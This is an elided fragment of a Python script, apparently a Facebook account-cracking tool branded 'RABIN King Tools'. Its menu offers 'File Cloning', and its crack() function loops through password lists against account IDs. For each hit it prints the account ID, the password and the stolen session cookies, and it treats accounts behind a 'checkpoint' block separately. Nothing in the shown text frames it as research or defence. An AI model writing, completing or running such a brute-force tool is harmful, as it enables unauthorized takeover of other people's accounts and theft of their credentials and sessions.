...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mRABIN')
...
os.system('espeak -a 300 " Welcome,   to,  RABIN,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/RABIN.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[1;98m'
...
def login():
	banner()
	RABINj('\033[1;97m[1] File Cloning\n\033[1;97m[2] Contact With Admin\n\033[1;97m[0] \033[1;97mEXIT ')
	RABINj('\033[0;97m===============================================')
	RABIN= input('\033[1;97m[+] CHOOSE: ');time.sleep(0.01)
	if RABIN in ['m']:
		public()
	elif RABIN in ['1']:
		crack_file()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[RABIN-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#RABIN-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•RABIN-Cp] {idf} • {pw}')     
				...
				#RABIN-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•RABIN-Ok🖤] {idf} • {pw}\n\033[0;93m[🖤]= COOKIES •\x1b[1;91m{kuki} ')
				print('\x1b[1;91m==============================================================')
				os.system('espeak -a 300 " RABIN,  Ok,  id"')
